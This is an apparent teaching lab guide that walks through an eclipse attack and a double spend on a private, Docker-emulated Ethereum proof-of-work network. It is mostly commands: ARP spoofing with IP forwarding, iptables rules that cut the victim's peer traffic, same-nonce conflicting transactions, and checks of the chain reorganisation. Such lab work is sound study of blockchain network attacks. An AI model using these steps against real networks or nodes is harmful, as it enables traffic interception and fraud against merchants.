# Ethereum Proof-of-Work: Eclipse Attack & Double Spend Guide

This guide demonstrates how to successfully execute an Eclipse Attack on a private Ethereum Proof-of-Work (PoW) network, followed by a Double Spend exploit. 

### Network Architecture
* **The Real World (Main Chain):** AS 160 (`.71` BootNode Miner) and AS 161 (`.71` Miner)
* **The Victim:** AS 162 (`as162h-Ethereum-POW-02-Miner-10.162.0.71`)
* **The Attacker:** AS 162 (`as162h-new_eth_node-10.162.0.74`)

---

## Phase 1: The Eclipse Attack (Isolation)

> **Important Pre-Attack Check:** Before launching the attack, ensure that all nodes are actively mining and that block heights are increasing globally. You can verify this using the **Check Current Block Heights** diagnostic block in the [Appendix](#engine-initialization--mining-management). Run it a few times to confirm the block numbers are rising before proceeding.
> 
We will use the Attacker Node (`.74`) to intercept and drop all peer-to-peer communication to and from the Victim Node (`.71`), trapping it in its own isolated reality.

* **How the script works:** [`arp_spoof.py`](arp_spoof.py) executes a Man-in-the-Middle (MitM) attack. It tricks the victim node into thinking the attacker's MAC address belongs to the gateway router, and tricks the router into thinking the attacker is the victim node. This forces all traffic to route through the attacker's machine.

**1. Copy the ARP Spoof script to the Attacker container (From Host VM):**
```bash
docker cp arp_spoof.py as162h-new_eth_node-10.162.0.74:/tmp/arp_spoof.py
```

**2. Open a terminal inside the Attacker Node:**
```bash
docker exec -it as162h-new_eth_node-10.162.0.74 /bin/bash
```

**3. Reroute Traffic and Drop Packets (Inside Attacker Node):**
First, enable IP forwarding and start the ARP spoof to force `.71`'s traffic through you.
```bash
sysctl -w net.ipv4.ip_forward=1
python3 /tmp/arp_spoof.py &
```
Next, implement `iptables` rules to drop all TCP and UDP traffic, effectively severing `.71`'s Ethereum P2P connections:
```bash
iptables -A FORWARD -s 10.162.0.71 -p tcp -j REJECT --reject-with tcp-reset
iptables -A FORWARD -d 10.162.0.71 -p tcp -j REJECT --reject-with tcp-reset
iptables -A FORWARD -s 10.162.0.71 -p udp -j DROP
iptables -A FORWARD -d 10.162.0.71 -p udp -j DROP
```

**4. Verify the Eclipse (From Host VM):**
```bash
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "admin.peers.length"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 ip neigh
```
> **Expected Output:** `admin.peers.length` should return `0`. The MAC address of the router should now also be the MAC of the Attacker node. The victim is now completely blind to the real network. 

---

## Phase 2: The Double Spend

With the victim isolated, the blockchain splits into two competing realities. Because Node 162 is still a miner, it will continue to mine blocks, creating a "Fake" chain. 

**The Actors:**
* **Attacker Origin (10 ETH):** `0xCBF1...` 
* **Victim Merchant (30 ETH):** `0xF540...`
* **Attacker Safe/Bob (0 ETH):** `0xaB5A...`

* **How the scripts work:** The core of a Double Spend relies on the **Nonce** (the transaction counter for an account). [`fake_tx.py`](fake_tx.py) and [`real_tx.py`](real_tx.py) are explicitly coded to use the *exact same Nonce* from the Origin account. Ethereum protocol dictates an account can only use a nonce once. By sending the fake transaction to the isolated victim and the real transaction to the healthy network, both chains accept their respective transactions as valid.

**1. Inject the Transactions (From Host VM):**
Execute the python scripts to send conflicting transactions to the partitioned networks.
```bash
python3 fake_tx.py  # Sends 5 ETH to Victim Merchant (Only seen by Node 162)
python3 real_tx.py  # Sends 1 ETH to Attacker Safe (Seen by Nodes 160 & 161)
```

**2. Verify the Diverged Realities:**
Check the balances on the Real World vs. the Fake World.

**Real World Balances (Node 160 or 161):**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec '["0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24", "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9", "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"].forEach(addr => { console.log(addr + ": " + web3.fromWei(eth.getBalance(addr), "ether") + " ETH") })'
```
> **Expected Output (Real):**
> Origin: `8.999 ETH` (Spent 1 ETH + Gas)
> Victim: `30 ETH` (Unchanged)
> Bob: `1 ETH` (Received funds)

**Fake World Balances (Node 162):**
```bash
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec '["0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24", "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9", "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"].forEach(addr => { console.log(addr + ": " + web3.fromWei(eth.getBalance(addr), "ether") + " ETH") })'
```
> **Expected Output (Fake):**
> Origin: `4.999 ETH` (Spent 5 ETH + Gas)
> Victim: `35 ETH` (Victim thinks they got paid!)
> Bob: `0 ETH` (Unchanged)

---

## Phase 3: The Chain Reorganization (The Vanish)

In PoW, the longest chain is always accepted as the absolute truth. Since the Real World has two miners (160 and 161) and the Fake World only has one (162), the Real World chain will be longer. 

**1. Release the Victim (Inside Attacker `.74` Terminal):**
Flush the firewall rules and kill the ARP spoofing script.
```bash
iptables -F
# Press CTRL+C to stop arp_spoof.py
```

**2. Force Network Reconnection (From Host VM):**
Get the BootNode's enode URL and feed it to the victim.
```bash
# Get BootNode Enode
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "admin.nodeInfo.enode"

# Manually add peer to Victim (Replace <ENODE> with the output above, ensuring IP is 10.160.0.71)
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "admin.addPeer('<ENODE>')"
```

**3. Watch the Magic Happen:**
Within seconds, Node 162 will reconnect to the network, compare block heights, and realize its chain is shorter. It will discard its "Fake" blocks (including the 5 ETH transaction) and download the "Real" blocks.

Run the balance check on Node 162 again:
```bash
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec '["0xCBF1e330F0abD5c1ac979CF2B2B874cfD4902E24", "0xF5406927254d2dA7F7c28A61191e3Ff1f2400fe9", "0xaB5AaD8284868B91Eb537d28aB1A159740D54890"].forEach(addr => { console.log(addr + ": " + web3.fromWei(eth.getBalance(addr), "ether") + " ETH") })'
```
> **Final Expected Output (Node 162):**
> Origin: `8.999 ETH`
> Victim: `30 ETH` *(The 5 ETH have vanished!)*
> Bob: `1 ETH` 

The Double Spend is complete. The attacker kept their money (sent to Bob) and the victim lost both the payment and the goods.

---

## Appendix: Helper Commands


### Engine Initialization & Mining Management

**1. Node 160 (BootNode Miner)**

```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "miner.stop()"
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "miner.setEtherbase(eth.accounts[0])"
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "miner.start(1)"
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "eth.mining"

```

**2. Node 161 (Real World Miner)**

```bash
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "miner.stop()"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "miner.setEtherbase(eth.accounts[0])"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "miner.start(1)"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "eth.mining"

```

**3. Node 162 (The Victim)**

```bash
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "miner.stop()"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "miner.setEtherbase(eth.accounts[0])"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "miner.start(1)"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "eth.mining"

```

---

### Diagnostics

**Check Current Block Heights:**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "eth.blockNumber"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "eth.blockNumber"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "eth.blockNumber"
```

**Find the Local Mining Accounts:**
```bash
docker exec -it as160h-Ethereum-POW-00-Miner-BootNode-10.160.0.71 geth attach --exec "eth.accounts"
docker exec -it as161h-Ethereum-POW-01-Miner-10.161.0.71 geth attach --exec "eth.accounts"
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "eth.accounts"
```

**Check pending transactions:**
```bash
docker exec -it as162h-Ethereum-POW-02-Miner-10.162.0.71 geth attach --exec "txpool.status"
```